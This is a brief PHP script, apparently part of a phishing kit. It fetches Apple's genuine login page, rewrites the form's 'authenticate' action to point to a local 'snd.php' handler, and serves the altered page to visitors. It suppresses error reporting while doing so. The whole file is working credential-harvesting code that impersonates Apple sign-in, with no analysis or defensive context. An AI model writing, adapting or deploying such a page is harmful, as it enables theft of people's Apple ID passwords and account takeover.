<?php
//----------- INC
error_reporting(0);
include 'funciones.php';
//----------- VAR
$url = 'https://idmsa.apple.com/IDMSWebAuth/login?appIdKey=f31f79834d96d16758d6f9f15061f7b91f60899ac3c1fd902db70189411e5850&path=index.jsp';
$usr = $_SERVER['HTTP_USER_AGENT'];
//----------- CRL
$safha = Anon_http(0, $usr, $url, 0, 0, 1, 1, 0, 1, 0);

$safha = _9lab_69('authenticate','./snd.php?',$safha);
echo $safha;